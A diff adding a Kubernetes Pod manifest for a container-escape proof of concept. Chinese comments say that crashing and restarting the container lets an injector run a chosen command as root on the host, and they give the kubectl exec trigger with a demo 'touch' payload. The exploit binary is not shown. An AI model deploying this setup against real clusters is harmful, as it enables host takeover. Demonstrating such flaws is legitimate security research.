@@ -1,0 +1,27 @@
+# pcce restart mode demo
+# 利用容器重启的 ELF 加载链注入逃逸
+# 部署后: kubectl exec -n pcce-demo pcce-restart -- /pcce restart --cmd 'touch /tmp/pwned-restart'
+# 容器会 crash → 自动重启 → injector 执行 → 宿主机 root 执行 payload → 容器恢复
+# 验证: 宿主机 ls /tmp/pwned-restart
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pcce-restart
+  namespace: pcce-demo
+  labels:
+    app: pcce-restart
+spec:
+  containers:
+  - name: exploit
+    image: ubuntu:22.04
+    command: ["/bin/sh", "-c", "while sleep 3600; do :; done"]
+    securityContext:
+      runAsUser: 1000
+      runAsGroup: 1000
+    resources:
+      limits:
+        memory: "128Mi"
+        cpu: "200m"
+  # restartPolicy=Always 是 K8s 默认值
+  # 容器 crash 后 kubelet 自动重启，触发利用链
+  restartPolicy: Always
